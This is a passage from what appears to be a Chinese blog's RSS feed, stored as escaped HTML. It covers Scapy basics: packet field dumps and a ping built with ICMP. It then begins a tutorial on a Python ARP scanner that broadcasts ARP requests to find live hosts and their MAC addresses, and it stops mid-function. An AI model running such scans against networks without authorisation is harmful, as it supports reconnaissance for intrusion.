&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">src&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">b7&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">58&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">44&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">e5&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">type&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">IPv4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">###[ IP ]###&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">version&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ihl&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tos&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mh">0x0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">len&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">id&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flags&lt;/span>&lt;span class="o">=&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">frag&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ttl&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">64&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">proto&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">tcp&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">chksum&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">src&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mf">192.168.0.110&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">dst&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> \&lt;span class="n">options&lt;/span>\
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">###[ TCP ]###&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sport&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">ftp_data&lt;/span> &lt;span class="c1"># 默认源端口为ftp_data的20端口&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">dport&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">http&lt;/span> &lt;span class="c1"># 默认目的端口是http的80端口&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">seq&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ack&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">dataofs&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">reserved&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flags&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">S&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">window&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">8192&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">chksum&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">urgptr&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">options&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="使用-scapy-实现-ping">使用 scapy 实现 ping
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">packet&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">IP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dst&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;192.168.0.106&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">ICMP&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;I&amp;#39;m a ping bag&amp;#34;&lt;/span> &lt;span class="c1"># 构造一个 ping 包&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">reply&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sr1&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">packet&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># 发送包并接收一个回应的包&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Begin&lt;/span> &lt;span class="n">emission&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">..&lt;/span>&lt;span class="n">Finished&lt;/span> &lt;span class="n">sending&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="n">packets&lt;/span>&lt;span class="o">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">........................*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Received&lt;/span> &lt;span class="mi">27&lt;/span> &lt;span class="n">packets&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">got&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="n">answers&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">remaining&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="n">packets&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span class="n">reply&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">show&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1"># 显示接收包的信息&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">###[ IP ]###&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">version&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ihl&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">5&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tos&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mh">0x0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">len&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">42&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">id&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">55515&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flags&lt;/span>&lt;span class="o">=&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">frag&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ttl&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">64&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">proto&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">icmp&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">chksum&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mh">0x1fd0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">src&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mf">192.168.0.106&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">dst&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mf">192.168.0.109&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> \&lt;span class="n">options&lt;/span>\
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">###[ ICMP ]###&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">type&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">echo&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">reply&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">code&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">chksum&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mh">0x87fd&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">id&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mh">0x0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">seq&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mh">0x0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">###[ Raw ]###&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">load&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;I&amp;#39;m a ping bag&amp;#34;&lt;/span> &lt;span class="c1"># 可以发现返回的数据和我们发送的是一样的&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="结语">结语
&lt;/h2>&lt;p>通过上面的两个例子，我们简单的使用了一下 scapy，能够很明确的体会到 scapy 功能的强大与使用的简单，想要学习更多 scapy 的命令行使用可以查看&lt;a class="link" href="https://scapy.readthedocs.io/en/latest/introduction.html" target="_blank" rel="noopener"
>官方文档&lt;/a>进行学习。&lt;/p>
&lt;p>在后面的学习中，我们将使用 scapy 用编写 Python 程序的方式来完成我们的各种需求。&lt;/p></description></item><item><title>Scapy编程实例之ARP扫描</title><link>https://wlynxg.github.io/blog/p/scapy%E7%BC%96%E7%A8%8B%E5%AE%9E%E4%BE%8B%E4%B9%8Barp%E6%89%AB%E6%8F%8F/</link><pubDate>Fri, 22 Aug 2025 17:34:52 +0800</pubDate><guid>https://wlynxg.github.io/blog/p/scapy%E7%BC%96%E7%A8%8B%E5%AE%9E%E4%BE%8B%E4%B9%8Barp%E6%89%AB%E6%8F%8F/</guid><description>&lt;h1 id="scapy编程实例之arp扫描">Scapy编程实例之ARP扫描
&lt;/h1>&lt;h2 id="简述">简述
&lt;/h2>&lt;p>ARP协议（全称：&lt;strong>A&lt;/strong>ddress &lt;strong>R&lt;/strong>esolution &lt;strong>P&lt;/strong>rotocol，中文名称：&lt;strong>地址解析协议&lt;/strong>）是一个通过解析网络层地址来找寻数据链路层地址的网络传输协议（通过 IP 地址找到 Mac地址）。&lt;/p>
&lt;p>ARP 协议作为一个重要的寻址协议，只要是运行在以太网上的主机，都必定不会屏蔽它，因此 ARP 是一个扫描局域网行之有效的办法，它比 ping扫描效率更高，结果更准确。&lt;/p>
&lt;h2 id="arp-包">ARP 包
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">###[ Ethernet ]###&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">dst&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">e4&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">d3&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">d2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">cc&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">src&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">b8&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">08&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">cf&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">b4&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">ba&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">e5&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">type&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">ARP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">###[ ARP ]###&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hwtype&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mh">0x1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ptype&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">IPv4&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hwlen&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">plen&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">op&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">who&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">has&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hwsrc&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="n">b8&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">08&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">cf&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">b4&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">ba&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">e5&lt;/span> &lt;span class="c1"># 源MAC地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">psrc&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mf">192.168.0.109&lt;/span> &lt;span class="c1"># 源IP地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hwdst&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mi">00&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">00&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">00&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">00&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">00&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">00&lt;/span> &lt;span class="c1"># 目的Mac地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pdst&lt;/span>&lt;span class="o">=&lt;/span> &lt;span class="mf">0.0.0.0&lt;/span> &lt;span class="c1"># 目的IP地址&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="arp扫描程序">ARP扫描程序
&lt;/h2>&lt;blockquote>
&lt;p>**注意：**由于Windows和Linux对于进程的管理方式不同，因此该程序不能在Windows系统上运行，否则会出现内存溢出的状况！&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;span class="lnt">70
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">ipaddress&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">logging&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">time&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">multiprocessing&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Queue&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Process&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">scapy.layers.l2&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Ether&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ARP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">scapy.sendrecv&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">srp&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">logging&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getLogger&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;scapy.runtime&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">setLevel&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">logging&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ERROR&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">scapy_arp_requests&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">queue&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">None&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ifname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;eth0&amp;#34;&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> 构造ARP包进行扫描
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :param host: 需要扫描的主机
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :param queue: 存储数据的队列
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :param ifname: 网卡名称
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :return: 无队列时返回 IP 和 Mac 地址，否则返回 None
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 构造ARP包&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result_raw&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">srp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Ether&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dst&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;FF:FF:FF:FF:FF:FF&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">/&lt;/span> &lt;span class="n">ARP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">op&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">hwdst&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;00:00:00:00:00:00&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">pdst&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">),&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">timeout&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">iface&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">ifname&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">verbose&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">False&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 取出成功响应的ARP包数据&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result_list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">result_raw&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">res&lt;/span>
